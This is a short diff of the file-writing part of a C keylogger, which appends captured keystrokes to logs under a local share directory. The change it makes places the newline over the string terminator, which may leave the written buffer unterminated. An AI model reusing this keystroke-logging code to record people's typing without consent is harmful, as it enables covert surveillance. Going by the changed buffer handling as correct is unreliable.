@@ -8,7 +8,6 @@
 #include <constants/constants.h>
 #include <file/file_handler.h>
 #include <mem.h>
-#include <errno.h>
 
 
 #define SAVE_PATH  ".local/share/keylogger/logs/"
@@ -64,7 +63,7 @@ void append_to_file(const char **keystroke_buffer, size_t keystroke_buffer_s, in
         strcat(message_to_write, keystroke_buffer[merge]);
     }
     REALLOC_MEM(message_to_write, strlen(message_to_write) + 2, sizeof(char));
-    message_to_write[strlen(message_to_write) - 1] = '\n';
+    message_to_write[strlen(message_to_write)] = '\n';
 
     if (write(kb_log_fd, message_to_write, strlen(message_to_write)) == -1) {
         free(message_to_write);
